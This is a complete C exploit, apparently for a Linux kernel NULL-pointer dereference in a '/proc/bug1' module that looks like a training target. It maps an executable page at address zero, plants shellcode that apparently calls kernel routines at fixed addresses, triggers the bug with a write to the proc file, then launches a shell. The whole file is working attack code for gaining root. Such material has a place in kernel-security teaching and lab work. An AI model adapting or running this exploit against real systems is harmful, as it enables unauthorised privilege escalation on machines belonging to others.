#include <sys/mman.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#undef BEEFPAYLOAD

#ifdef BEEFPAYLOAD
char payload[] = "\xe9\xea\xbe\xad\x0b";
#else
// use makepayload.sh
char payload[] = "\x48\x31\xc0\x4c\x89\x14\x25\x70\x8b\x09\xb0\x41\xff\xd2\x4c\x89\x14\x25\x00\x88\x09\xb0\x41\xff\xd2\xc3";
#endif

int main()
{
	mmap(0, 4096, // one page
		PROT_READ | PROT_WRITE | PROT_EXEC,
		MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, // MAP_FIXED!
		-1, 0);

	memcpy(0, payload, sizeof(payload));

	int fd = open("/proc/bug1", O_WRONLY);
	write(fd, "foo", 3);

#ifndef BEEFPAYLOAD
	system("/bin/sh");
#endif
}
